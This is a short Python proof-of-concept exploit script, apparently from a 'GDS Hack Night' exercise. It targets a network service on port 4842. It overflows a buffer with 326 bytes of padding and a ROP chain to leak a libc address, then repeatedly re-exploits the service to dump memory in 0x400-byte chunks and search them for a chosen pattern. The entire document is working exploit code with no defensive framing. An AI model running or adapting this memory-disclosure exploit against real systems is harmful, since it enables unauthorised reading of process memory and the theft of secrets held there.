#!/usr/bin/python

# GDS Hack Night:
# This PoC uses the same memory disclosure technique that was used for the exploit 
# to leak big chunks of memory and look for patterns

import sys
import struct
import socket
import time

if len(sys.argv) < 3:
    print "usage: %s <target> <pattern>" % sys.argv[0]
    sys.exit(-1)

pattern = sys.argv[2].decode("string_escape")
#print(pattern)
#sys.exit()
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((sys.argv[1], 4842))
s.recv(1024)

eip_off=326
hrop = [
    0x08048770,
    0xdeadc0de,
    0x4, #0x8
    0x0804B03C,
    0x4,
    0x0
  ]
rop=""
for i in hrop:
  rop += struct.pack('I', i)

buf="A"*eip_off + rop
sys.stderr.write("[+] Writing %d bytes\n" % len(buf))
s.send(buf)
rbuf= s.recv(1024)
if len(rbuf) > 0:
    libc_start = struct.unpack('I',rbuf)[0]
    sys.stderr.write("[+] Received %d bytes, search will start at %s.\n" % (len(rbuf), hex(libc_start)))
else:
    sys.stderr.write("[-] nothing received\n")
    sys.exit(-1)
s.close()
time.sleep(1)

#phase2
search_addr = libc_start
search_interval = 0x400
while True:
    exit_flag=False
    sys.stderr.write("[+] Searching %d bytes starting at %s.\x0d" % (search_interval, hex(search_addr)))
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((sys.argv[1], 4842))
    s.recv(1024)
    eip_off=326
    hrop = [
        0x08048770,
        0xdeadc0de,
        0x4, #0x8
        search_addr,
        search_interval,
        0x0
      ]
    rop=""
    for i in hrop:
      rop += struct.pack('I', i)

    buf="A"*eip_off + rop
    #sys.stderr.write("[+] Writing %d bytes\n" % len(buf))
    s.send(buf)
    rbuf=s.recv(search_interval)
    if len(rbuf) == 0:
        sys.stderr.write("\n[-] nothing received, exiting\n")
        break
    else: 
        if len(rbuf) < search_interval:
            sys.stderr.write("\n[-] received only %d bytes, you're either exiting from mapped memory, or something bad is going on, will exit after this cycle\n" % len(rbuf))
            exit_flag = True
        
        offset=rbuf.find(pattern)
        if offset >= 0:
            sys.stderr.write("\n[*] Good news! pattern found at address %s\n" % hex(search_addr+offset))
            exit_flag=True
    
    if exit_flag:
        break
          
    s.close()
    search_addr += search_interval
    time.sleep(0.02)